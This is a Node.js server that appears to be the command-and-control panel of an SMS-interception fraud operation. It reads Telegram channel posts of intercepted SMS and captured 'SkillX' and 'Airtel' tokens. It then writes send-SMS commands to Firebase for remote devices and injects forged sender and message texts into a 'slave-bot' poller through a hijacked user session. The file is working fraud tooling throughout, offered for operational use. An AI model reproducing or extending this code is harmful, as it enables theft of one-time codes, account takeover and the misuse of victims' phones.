import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  tgGetStatus, tgStartLogin, tgVerifyCode, tgVerifyPassword,
  tgLogout, tgSendMessage, tgDisconnect
} from './tg-user.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CONFIG_FILE = path.join(__dirname, 'telegram_config.json');

let botInterval = null;
let lastUpdateId = 0;
let pollingBusy = false;
let botStatus = { running: false, startedAt: null, processed: 0, lastMessage: null, error: null };
let activeConfig = null;
let injectRunning = false;

// Load saved update offset so restarts don't re-process old messages
try {
  const saved = loadConfig();
  if (saved && saved.lastUpdateId) lastUpdateId = saved.lastUpdateId;
} catch {}

function loadConfig() {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
    }
  } catch {}
  return null;
}

function saveConfig(config) {
  fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 2), 'utf8');
}

function getFirebaseWriteUrl(baseUrl, deviceId) {
  let clean = baseUrl.replace(/\/\.json(\?.*)?$/, '').replace(/\/$/, '');
  let auth = '';
  const match = baseUrl.match(/[?&]auth=([^&]+)/);
  if (match) {
    auth = match[1];
  } else {
    auth = clean;
  }
  return `${clean}/clients/${encodeURIComponent(deviceId)}/webhookEvent/sendSms.json?auth=${encodeURIComponent(auth)}`;
}

async function sendToFirebase(config, to, message, sim) {
  const url = getFirebaseWriteUrl(config.firebaseUrl, config.deviceId);
  const payload = { from: sim || config.sim || 1, to, message, isSended: false };
  const res = await fetch(url, { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
  return { ok: res.ok, status: res.status };
}

async function sendTelegramMessage(botToken, chatId, text) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true })
    });
    return res.ok;
  } catch { return false; }
}

function parseSms(text) {
  let send_to = null, sms_content = null;
  const lines = text.split('\n').map(l => l.trim()).filter(Boolean);

  // SkillX Token Captured
  if (/SkillX\s+Token\s+Captured/i.test(text)) {
    for (const line of lines) {
      if (/To\s*[-:]\s*(\d+)/i.test(line)) send_to = line.match(/To\s*[-:]\s*(\d+)/i)[1];
      if (/Message\s*[-:]\s*(.+)/i.test(line)) sms_content = line.match(/Message\s*[-:]\s*(.+)/i)[1];
    }
    if (!send_to && /To\s*[-:]\s*(\d+)/i.test(text)) send_to = text.match(/To\s*[-:]\s*(\d+)/i)[1];
    if (!sms_content && /Message\s*[-:]\s*([^\n]+)/i.test(text)) sms_content = text.match(/Message\s*[-:]\s*([^\n]+)/i)[1];
    return send_to && sms_content ? { to: send_to, message: sms_content, type: 'SkillX Token' } : null;
  }

  // Intercepted SMS
  if (/SMS\s+Intercepted/i.test(text) || /Intercepted.*SMS/i.test(text)) {
    let toIdx = -1, bodyIdx = -1;
    for (let i = 0; i < lines.length; i++) {
      if (/To\s*(?:\(Tap to copy\))?:/i.test(lines[i])) toIdx = i;
      if (/Body\s*(?:\(Tap to copy\))?:/i.test(lines[i]) || /Message:/i.test(lines[i])) bodyIdx = i;
    }
    if (toIdx >= 0) {
      if (/(\+?\d{10,12})/.test(lines[toIdx])) send_to = lines[toIdx].match(/(\+?\d{10,12})/)[1];
      else if (toIdx + 1 < lines.length) {
        const m = lines[toIdx + 1].match(/(\+?\d{10,12})/);
        if (m) send_to = m[1];
      }
    }
    if (bodyIdx >= 0) {
      const m = lines[bodyIdx].match(/(?:Body|Message):\s*(.+)$/i);
      if (m) sms_content = m[1];
      else if (bodyIdx + 1 < lines.length) sms_content = lines.slice(bodyIdx + 1).filter(l => !/Click on values/i.test(l)).join(' ');
    }
    if (send_to && sms_content) {
      send_to = send_to.replace(/^\+/, '');
      if (send_to.length === 12 && send_to.startsWith('91')) send_to = send_to.slice(2);
      else if (send_to.length === 11 && send_to.startsWith('0')) send_to = send_to.slice(1);
      return { to: send_to, message: sms_content.replace(/\s+/g, ' ').trim(), type: 'Intercepted SMS' };
    }
    return null;
  }

  // Airtel Token
  if (/AIRTEL\s+TOKEN/i.test(text) || /Receipt:\s*(\d+)/i.test(text)) {
    const r = text.match(/Receipt:\s*(\d+)/i);
    const t = text.match(/Token:\s*\n?\s*(.+?)(?:\n━|$)/s);
    if (r && t) {
      let to = r[1].replace(/^0+/, '');
      let msg = t[1].replace(/\s+/g, '').trim();
      return { to, message: msg, type: 'Airtel Token' };
    }
    return null;
  }

  // Standard format
  if (/📞\s*To:/i.test(text)) {
    const m = text.match(/To:\s*\+?(\d+)/i);
    if (m) {
      send_to = m[1];
      const msgMatch = text.match(/Message:\s*(.+?)$/ms);
      if (msgMatch) sms_content = msgMatch[1].replace(/\n+/g, ' ').replace(/\s+/g, ' ').trim();
      if (send_to && sms_content) {
        send_to = send_to.replace(/^\+/, '');
        if (send_to.length === 12 && send_to.startsWith('91')) send_to = send_to.slice(2);
        return { to: send_to, message: sms_content, type: 'Standard' };
      }
    }
  }

  return null;
}

async function pollOnce(config) {
  try {
    const startTs = Date.now();
    const url = `https://api.telegram.org/bot${config.botToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=["channel_post","message"]`;
    const res = await fetch(url);
    const latency = Date.now() - startTs;
    const data = await res.json();
    if (!data.ok) { botStatus.error = data.description; return; }

    for (const update of data.result || []) {
      lastUpdateId = update.update_id;
      const msg = update.channel_post || update.message;
      if (!msg || !msg.text) continue;

      const chatId = String(msg.chat.id);
      if (config.channelId && chatId !== String(config.channelId)) continue;

      const text = msg.text.trim();

      if (text === '/ping') {
        setImmediate(() => sendTelegramMessage(config.botToken, chatId,
          `🏓 <b>Pong!</b>\n📡 Latency: <code>${latency}ms</code>\n⏱️ Server: <code>${new Date().toLocaleTimeString()}</code>`
        ));
        continue;
      }

      if (text === '/status') {
        const s = `🤖 <b>Bot Status</b>\n\n✅ Running\n📤 Processed: <b>${botStatus.processed}</b>\n📱 Device: <code>${config.deviceId}</code>\n📶 SIM: ${config.sim || 1}\n📡 DB: ${(config.firebaseUrl || '').replace(/\/\/[^@]+@/, '//***@')}`;
        setImmediate(() => sendTelegramMessage(config.botToken, chatId, s));
        continue;
      }

      const parsed = parseSms(text);
      if (!parsed) continue;

      setImmediate(async () => {
        try {
          const fbRes = await sendToFirebase(config, parsed.to, parsed.message, config.sim);
          botStatus.processed++;
          botStatus.lastMessage = { to: parsed.to, type: parsed.type, time: new Date().toISOString(), ok: fbRes.ok };
          botStatus.error = fbRes.ok ? null : `Firebase HTTP ${fbRes.status}`;
          const reply = fbRes.ok
            ? `✅ <b>${parsed.type} Sent Successfully!</b>\n\n📱 To: <code>${parsed.to}</code>\n📶 SIM: ${config.sim || 1}\n📲 Device: <code>${config.deviceId}</code>\n💬 Preview: <code>${parsed.message.slice(0, 60)}${parsed.message.length > 60 ? '...' : ''}</code>\n🕐 ${new Date().toLocaleTimeString()}`
            : `❌ <b>${parsed.type} Failed</b>\n\n📱 To: <code>${parsed.to}</code>\n⚠️ Firebase: HTTP ${fbRes.status}\n🕐 ${new Date().toLocaleTimeString()}`;
          await sendTelegramMessage(config.botToken, chatId, reply);
        } catch (e) {
          botStatus.error = e.message;
        }
      });
    }
  } catch (err) {
    botStatus.error = err.message;
  }
  try { const c = loadConfig(); if (c) { c.lastUpdateId = lastUpdateId; saveConfig(c); } } catch {}
}

async function sendTestMessage(config) {
  if (!config) return { ok: false, error: 'Bot not started' };
  const testMsg =
`📱 Intercepted Outgoing SMS

To (Tap to copy):
+919999999999

Body (Tap to copy):
🧪 Test message from Panel — ${new Date().toLocaleString()}

📋 One-tap copy: Test`;
  const ok = await sendTelegramMessage(config.botToken, config.channelId, testMsg);
  return { ok, error: ok ? null : 'Failed to send test message to channel' };
}

async function pollLoop(config) {
  if (!botStatus.running || pollingBusy) return;
  pollingBusy = true;
  await pollOnce(config);
  pollingBusy = false;
  if (botStatus.running) {
    botInterval = setTimeout(() => pollLoop(config), 200);
  }
}

export function startBot(config) {
  if (botInterval) stopBot();
  if (!config.botToken || !config.channelId || !config.firebaseUrl || !config.deviceId) {
    return { ok: false, error: 'Missing required config: botToken, channelId, firebaseUrl, deviceId' };
  }
  saveConfig(config);
  activeConfig = config;
  botStatus = { running: true, startedAt: new Date().toISOString(), processed: 0, lastMessage: null, error: null };
  pollingBusy = false;
  pollLoop(config);
  return { ok: true };
}

export function stopBot() {
  botStatus.running = false;
  if (botInterval) { clearTimeout(botInterval); botInterval = null; }
  pollingBusy = false;
  activeConfig = null;
  return { ok: true };
}

export function getStatus() {
  const config = loadConfig();
  return {
    ...botStatus,
    config: config ? {
      botToken: '***' + (config.botToken || '').slice(-6),
      channelId: config.channelId,
      deviceId: config.deviceId,
      sim: config.sim,
      firebaseUrl: (config.firebaseUrl || '').replace(/\/\/[^@]+@/, '//***@')
    } : null
  };
}

// HTTP API Server
const HOST = '127.0.0.1';
const PORT = 5180;

function jsonResponse(res, data, status = 200) {
  res.writeHead(status, {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  });
  res.end(JSON.stringify(data));
}

function readBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', c => body += c);
    req.on('end', () => { try { resolve(JSON.parse(body)); } catch { resolve(null); } });
  });
}

const server = http.createServer(async (req, res) => {
  if (req.method === 'OPTIONS') {
    res.writeHead(204, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end();
    return;
  }

  if (req.method === 'POST' && req.url === '/api/bot/start') {
    const config = await readBody(req);
    const result = startBot(config);
    jsonResponse(res, result, result.ok ? 200 : 400);
    return;
  }

  if (req.method === 'POST' && req.url === '/api/bot/stop') {
    jsonResponse(res, stopBot());
    return;
  }

  if (req.method === 'GET' && req.url === '/api/bot/status') {
    jsonResponse(res, getStatus());
    return;
  }

  if (req.method === 'POST' && req.url === '/api/bot/test') {
    const config = loadConfig();
    const result = await sendTestMessage(config);
    jsonResponse(res, result, result.ok ? 200 : 400);
    return;
  }

  if (req.method === 'GET' && req.url === '/api/env-dbs') {
    try {
      const envPath = path.join(__dirname, '.env');
      const env = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';
      const dbs = [];
      for (const match of env.matchAll(/^VITE_FIREBASE_URL(?:_(\d+))?=(.+)$/gm)) {
        const num = parseInt(match[1]) || 1;
        const url = match[2].trim();
        dbs.push({ num, url });
      }
      dbs.sort((a, b) => a.num - b.num);
      jsonResponse(res, { ok: true, dbs });
    } catch (err) {
      jsonResponse(res, { ok: false, error: err.message }, 500);
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/save-db') {
    const body = await readBody(req);
    if (!body || !body.name || !body.url) {
      jsonResponse(res, { ok: false, error: 'Missing name or url' }, 400);
      return;
    }
    try {
      const envPath = path.join(__dirname, '.env');
      let env = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';
      let max = 0;
      for (const match of env.matchAll(/VITE_FIREBASE_URL_(\d+)=/g)) {
        max = Math.max(max, parseInt(match[1]));
      }
      if (!max) max = 10;
      const next = max + 1;
      const line = `VITE_FIREBASE_URL_${next}=${body.url}`;
      env = env.trimEnd() + '\n' + line + '\n';
      fs.writeFileSync(envPath, env, 'utf8');
      jsonResponse(res, { ok: true, key: `VITE_FIREBASE_URL_${next}`, line });
    } catch (err) {
      jsonResponse(res, { ok: false, error: err.message }, 500);
    }
    return;
  }

  if (req.method === 'GET' && req.url === '/api/bot/env-config') {
    try {
      const envPath = path.join(__dirname, '.env');
      let botToken = '', channelId = '', injectBotToken = '', injectChatId = '', injectBotUsername = '';
      if (fs.existsSync(envPath)) {
        const env = fs.readFileSync(envPath, 'utf8');
        const tMatch = env.match(/^BOT_TOKEN=(.*)$/m);
        if (tMatch) botToken = tMatch[1].trim();
        const cMatch = env.match(/^CHANNEL_ID=(.*)$/m);
        if (cMatch) channelId = cMatch[1].trim();
        const itMatch = env.match(/^POLLER_BOT_TOKEN=(.*)$/m);
        if (itMatch) injectBotToken = itMatch[1].trim();
        const icMatch = env.match(/^POLLER_CHAT_ID=(.*)$/m);
        if (icMatch) injectChatId = icMatch[1].trim();
        const iuMatch = env.match(/^POLLER_BOT_USERNAME=(.*)$/m);
        if (iuMatch) injectBotUsername = iuMatch[1].trim();
      }
      jsonResponse(res, { ok: true, botToken, channelId, injectBotToken, injectChatId, injectBotUsername });
    } catch (err) {
      jsonResponse(res, { ok: false, error: err.message }, 500);
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/bot/save-env') {
    const body = await readBody(req);
    if (!body || (!body.botToken && !body.channelId && !body.injectBotToken && !body.injectChatId && !body.injectBotUsername)) {
      jsonResponse(res, { ok: false, error: 'Missing values' }, 400);
      return;
    }
    try {
      const envPath = path.join(__dirname, '.env');
      let env = fs.existsSync(envPath) ? fs.readFileSync(envPath, 'utf8') : '';
      const lines = env.split('\n');
      const newLines = {};
      if (body.botToken !== undefined) newLines.BOT_TOKEN = body.botToken;
      if (body.channelId !== undefined) newLines.CHANNEL_ID = body.channelId;
      if (body.injectBotToken !== undefined) newLines.POLLER_BOT_TOKEN = body.injectBotToken;
      if (body.injectChatId !== undefined) newLines.POLLER_CHAT_ID = body.injectChatId;
      if (body.injectBotUsername !== undefined) newLines.POLLER_BOT_USERNAME = body.injectBotUsername;
      const seen = new Set();
      const updated = lines.map(line => {
        const key = line.split('=')[0];
        if (key in newLines) {
          seen.add(key);
          return `${key}=${newLines[key]}`;
        }
        return line;
      });
      for (const [k, v] of Object.entries(newLines)) {
        if (!seen.has(k)) updated.push(`${k}=${v}`);
      }
      fs.writeFileSync(envPath, updated.join('\n') + '\n', 'utf8');
      jsonResponse(res, { ok: true });
    } catch (err) {
      jsonResponse(res, { ok: false, error: err.message }, 500);
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/send-message') {
    const body = await readBody(req);
    if (!body || !body.botToken || !body.chatId || !body.text) {
      jsonResponse(res, { ok: false, error: 'Missing botToken, chatId, or text' }, 400);
      return;
    }
    const ok = await sendTelegramMessage(body.botToken, body.chatId, body.text);
    jsonResponse(res, { ok, error: ok ? null : 'Telegram API error' }, ok ? 200 : 400);
    return;
  }

  if (req.method === 'POST' && req.url === '/api/bot/inject') {
    const body = await readBody(req);
    if (!body || !body.chatId || !body.sender || !body.message) {
      jsonResponse(res, { ok: false, error: 'Missing chatId, sender, or message' }, 400);
      return;
    }
    if (!injectRunning) {
      jsonResponse(res, { ok: false, error: 'Inject stopped — pehle Start karo' }, 400);
      return;
    }
    // Format slave-bot_poller.sh compatible: SENDER ID = / MESSAGE =
    const text = `SENDER ID = ${body.sender}\nMESSAGE = ${body.message}`;
    // HAMESHA user-session (MTProto) se — message tumhari id se poller bot ko jayega.
    // Agar chatId khud ki id hai (Saved Messages), to botUsername/botPeerId pe redirect hota hai.
    const botPeerId = body.botToken && String(body.botToken).includes(':') ? String(body.botToken).split(':')[0] : null;
    const tgRes = await tgSendMessage(body.chatId, text, { botPeerId, botUsername: body.botUsername });
    if (tgRes.ok) {
      jsonResponse(res, { ok: true, via: 'user' });
      return;
    }
    jsonResponse(res, { ok: false, error: tgRes.error || 'Not sent' }, 400);
    return;
  }

  const sendInjectControl = async (body, command) => {
    if (!body || !body.chatId) return { ok: false, error: 'Missing chatId' };
    const botPeerId = body.botToken && String(body.botToken).includes(':') ? String(body.botToken).split(':')[0] : null;
    const text = command === 'INJECT_START' ? 'INJECT_START' : 'INJECT_STOP';
    const tgRes = await tgSendMessage(body.chatId, text, { botPeerId, botUsername: body.botUsername });
    return tgRes;
  };

  if (req.method === 'POST' && req.url === '/api/inject/start') {
    const body = await readBody(req);
    const ctl = await sendInjectControl(body, 'INJECT_START');
    if (ctl.ok) {
      injectRunning = true;
      jsonResponse(res, { ok: true, running: true });
    } else {
      jsonResponse(res, { ok: false, error: ctl.error || 'Control message failed' }, 400);
    }
    return;
  }

  if (req.method === 'POST' && req.url === '/api/inject/stop') {
    const body = await readBody(req);
    const ctl = await sendInjectControl(body, 'INJECT_STOP');
    injectRunning = false;
    if (ctl.ok) {
      jsonResponse(res, { ok: true, running: false });
    } else {
      jsonResponse(res, { ok: false, running: false, error: ctl.error || 'Control message failed' }, 400);
    }
    return;
  }

  if (req.method === 'GET' && req.url === '/api/inject/status') {
    jsonResponse(res, { ok: true, running: injectRunning });
    return;
  }

  if (req.method === 'GET' && req.url === '/api/tg-user/status') {
    const s = await tgGetStatus();
    jsonResponse(res, s);
    return;
  }

  if (req.method === 'POST' && req.url === '/api/tg-user/login') {
    const body = await readBody(req);
    if (!body || !body.phone) {
      jsonResponse(res, { ok: false, error: 'Missing phone' }, 400);
      return;
    }
    const result = await tgStartLogin(body.phone);
    jsonResponse(res, result, result.ok ? 200 : 400);
    return;
  }

  if (req.method === 'POST' && req.url === '/api/tg-user/verify') {
    const body = await readBody(req);
    if (!body || !body.code) {
      jsonResponse(res, { ok: false, error: 'Missing code' }, 400);
      return;
    }
    const result = await tgVerifyCode(body.code);
    jsonResponse(res, result, result.ok ? 200 : 400);
    return;
  }

  if (req.method === 'POST' && req.url === '/api/tg-user/password') {
    const body = await readBody(req);
    if (!body || !body.password) {
      jsonResponse(res, { ok: false, error: 'Missing password' }, 400);
      return;
    }
    const result = await tgVerifyPassword(body.password);
    jsonResponse(res, result, result.ok ? 200 : 400);
    return;
  }

  if (req.method === 'POST' && req.url === '/api/tg-user/logout') {
    jsonResponse(res, await tgLogout());
    return;
  }

  jsonResponse(res, { error: 'Not found' }, 404);
});

server.listen(PORT, HOST, () => {
  console.log(`🤖 Telegram Bot API server running on http://${HOST}:${PORT}`);
  console.log(`   POST /api/bot/start   - Start bot`);
  console.log(`   POST /api/bot/stop    - Stop bot`);
  console.log(`   GET  /api/bot/status  - Get status`);
  console.log(`   POST /api/bot/test    - Send test message to channel`);
});

export { server, parseSms, sendToFirebase, getFirebaseWriteUrl };
